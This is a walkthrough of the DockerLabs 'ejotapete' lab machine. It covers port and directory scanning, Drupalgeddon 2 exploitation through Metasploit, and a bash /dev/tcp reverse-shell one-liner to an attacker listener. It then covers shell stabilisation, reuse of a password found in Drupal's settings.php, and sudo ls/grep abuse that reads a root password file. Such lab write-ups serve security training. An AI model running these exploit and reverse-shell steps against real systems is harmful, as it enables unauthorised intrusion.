# ejotapete

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| ejotapete | El Pingüino de Mario | Easy / Facil | dockerlabs |

**Summary:** The ejotapete machine exposes a single HTTP port running Apache, whose root path returns a 403 Forbidden. Directory enumeration immediately surfaces a `/drupal/` installation, which upon inspection turns out to be a vulnerable version of Drupal 7.x or 8.x susceptible to the well-known Drupalgeddon 2 (CVE-2018-7600) remote code execution vulnerability. Metasploit's `drupal_drupalgeddon2` module is used to exploit the Forms API property injection flaw, landing a Meterpreter shell as `www-data`. The Meterpreter shell is then upgraded into a fully interactive PTY-backed bash session using `script`, `stty`, and terminal environment variables. Internal enumeration of the Drupal configuration file `sites/default/settings.php` reveals credentials for the local system user `ballenita`, whose password is stored in a commented-out database credential block with a playful developer comment. Switching to `ballenita` via `su`, a `sudo -l` check shows this user can execute `/bin/ls` and `/bin/grep` as root without a password. These two binaries are chained to first list the contents of the root home directory, which exposes a file named `secretitomaximo.txt`, and then read it with `sudo grep`, recovering the root account password in plaintext. A final `su - root` with the recovered password yields a complete root shell.

---

## Reconnaissance

**1. Deploying the Machine**

The lab environment is started with the provided deployment script.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ sudo bash auto_deploy.sh ejotapete.tar 
[sudo] password for ouba: 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""""\___ / ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

The machine is assigned the IP address `172.17.0.2`.

**2. Port Scan**

A full-port Nmap scan with service and script detection is run against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-25 19:43 WIB
Nmap scan report for 172.17.0.2
Host is up (0.000010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
```

Only port 80 is open, running Apache 2.4.25 on Debian. The root path returns a 403 Forbidden, meaning direct access to the web root is blocked and hidden content must be discovered via enumeration.

**3. Web Content Discovery**

Gobuster is used to brute-force directories and files on the server with a broad set of extensions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ gobuster dir -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,json,js,bak,sql,zip,tar,env
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              env,php,html,txt,json,js,bak,sql,zip,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
/server-status        (Status: 403) [Size: 298]
Progress: 2426127 / 2426127 (100.00%)
===============================================================
Finished
===============================================================
```

A Drupal installation is discovered at `/drupal/`, redirecting with a 301. Navigating to it in the browser confirms a functioning Drupal CMS instance.

![Drupal installation discovered at /drupal/](image.png)

---

## Initial Access

### Exploiting Drupalgeddon 2 (CVE-2018-7600)

The Drupal version exposed is affected by Drupalgeddon 2, a critical unauthenticated remote code execution vulnerability in the Forms API. Metasploit's `drupal_drupalgeddon2` module is selected, configured, and executed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ msfconsole -q 
msf > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)         .                .          .      .
   2     \_ target: Automatic (PHP Dropper)           .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)        .                .          .      .
   4     \_ target: Automatic (Linux Dropper)         .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)        .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)          .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)       .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)        .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)        .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)          .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)       .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)        .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                     .                .          .      .
   14    \_ AKA: Drupalgeddon 2                       .                .          .      .
   15  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   16  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   17    \_ target: PHP In-Memory                     .                .          .      .
   18    \_ target: Unix In-Memory                    .                .          .      .
   19  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   20  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 20, use 20 or use exploit/unix/webapp/php_xmlrpc_eval

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal/
TARGETURI => /drupal/
msf exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (41224 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:60560) at 2026-07-25 20:38:54 +0700
```

The exploit confirms the target is vulnerable and successfully opens a Meterpreter session. A system shell is then spawned to verify the current user context.

```bash
meterpreter > shell
Process 369 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution is confirmed as `www-data`, the Apache web server process owner.

### Upgrading to a Fully Interactive Shell

The Meterpreter shell is limited in interactivity. To enable full PTY features (tab completion, `su`, and proper signal handling), a reverse bash shell is caught on a separate listener and then upgraded.

A `netcat` listener is started on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Inside the Meterpreter shell, a bash reverse shell one-liner is executed:

`bash -c "bash -i >& /dev/tcp/172.17.0.1/1337 0>&1"`

The connection is caught:

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44808
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c7227d282334:/var/www/html/drupal$ 
```

The shell is then upgraded to a fully interactive TTY using the `script` technique and `stty` settings:

```bash
www-data@c7227d282334:/var/www/html/drupal$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@c7227d282334:/var/www/html/drupal$ ^Z
zsh: suspended  nc -lvnp 1337

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/ejotapete]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

www-data@c7227d282334:/var/www/html/drupal$ export TERM=xterm
www-data@c7227d282334:/var/www/html/drupal$ export SHELL=/bin/bash
www-data@c7227d282334:/var/www/html/drupal$ stty rows 80 cols 130
```

A fully stable, interactive shell is now available.

---

## Lateral Movement

### Credential Discovery in Drupal Configuration

Listing `/home` reveals a single local user named `ballenita`.

```bash
www-data@c7227d282334:/var/www/html/drupal$ ls -la /home
total 12
drwxr-xr-x 1 root      root      4096 Oct 16  2024 .
drwxr-xr-x 1 root      root      4096 Jul 25 12:41 ..
drwxr-xr-x 2 ballenita ballenita 4096 Oct 16  2024 ballenita
```

A recursive grep is run inside the Drupal web root, searching for any reference to this username in configuration files and source code.

```bash
www-data@c7227d282334:/var/www/html/drupal$ grep -rn "ballenita" .
./sites/default/settings.php:81: *   'username' => 'ballenita',
./sites/default/settings.php:82: *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
Binary file ./sites/default/files/.ht.sqlite matches
```

The Drupal `settings.php` file contains a commented-out database credential block with the password `ballenitafeliz` stored in plaintext alongside a developer note reading "Cuidadito cuidadín pillin" (loosely: "Careful, careful, you rascal"). This credential is immediately tested against the local system user `ballenita`.

```bash
www-data@c7227d282334:/var/www/html/drupal$ su - ballenita
Password: 
ballenita@c7227d282334:~$ id;whoami;hostname
uid=1000(ballenita) gid=1000(ballenita) groups=1000(ballenita)
ballenita
c7227d282334
```

The password is reused and lateral movement to `ballenita` is successful.

---

## Privilege Escalation

### sudo Abuse via /bin/ls and /bin/grep

A check of the `sudo` configuration for `ballenita` reveals two allowed binaries executable as root without a password.

```bash
ballenita@c7227d282334:~$ which sudo
/usr/bin/sudo
ballenita@c7227d282334:~$ sudo -l
Matching Defaults entries for ballenita on c7227d282334:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on c7227d282334:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

`/bin/ls` and `/bin/grep` are both allowed as root with no password requirement. While neither binary provides a direct shell, they can be chained to read arbitrary files owned by root. First, `sudo ls` is used to list the root home directory and reveal its contents.

```bash
ballenita@c7227d282334:~$ sudo /bin/ls -la /root
total 28
drwx------ 1 root root 4096 Oct 16  2024 .
drwxr-xr-x 1 root root 4096 Jul 25 12:41 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Mar 14  2018 .wget-hsts
-rw-r--r-- 1 root root   35 Oct 16  2024 secretitomaximo.txt
```

A file named `secretitomaximo.txt` is present in the root home directory. Its contents are extracted using `sudo grep` with an empty pattern to match every line.

```bash
ballenita@c7227d282334:~$ sudo grep '' /root/secretitomaximo.txt
nobodycanfindthispasswordrootrocks
```

The root password `nobodycanfindthispasswordrootrocks` is recovered in plaintext. It is used immediately with `su - root` to escalate to a full root shell.

```bash
ballenita@c7227d282334:~$ su - root
Password: 
root@c7227d282334:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
c7227d282334
```

Full root access is achieved.

---

## Attack Chain Summary
1. **Reconnaissance**: An Nmap scan reveals only port 80 open, running Apache 2.4.25 on Debian. The root path returns a 403, prompting directory enumeration with Gobuster, which uncovers a Drupal installation at `/drupal/`.
2. **Vulnerability Discovery**: The Drupal instance is identified as vulnerable to Drupalgeddon 2 (CVE-2018-7600), a critical unauthenticated remote code execution flaw in the Forms API. Metasploit's automatic check confirms the target is exploitable.
3. **Exploitation**: The `drupal_drupalgeddon2` Metasploit module is configured with the target host, attacker host, and the `/drupal/` base URI. Execution delivers a Meterpreter session as `www-data`. A reverse bash shell is then caught on a separate `netcat` listener and upgraded to a fully interactive PTY using `script`, `stty raw -echo`, and terminal environment exports.
4. **Internal Enumeration**: As `www-data`, a recursive grep of the Drupal web root for the username `ballenita` (discovered in `/home`) surfaces a commented-out credential block inside `sites/default/settings.php`, leaking the plaintext password `ballenitafeliz`. The password is successfully reused to switch user context via `su - ballenita`.
5. **Privilege Escalation**: The `sudo -l` output for `ballenita` shows that `/bin/ls` and `/bin/grep` may be run as root with no password. These are chained: `sudo ls` lists `/root` and reveals `secretitomaximo.txt`, then `sudo grep '' /root/secretitomaximo.txt` reads the file and recovers the root password `nobodycanfindthispasswordrootrocks`. A final `su - root` with this credential produces a complete `uid=0(root)` shell.
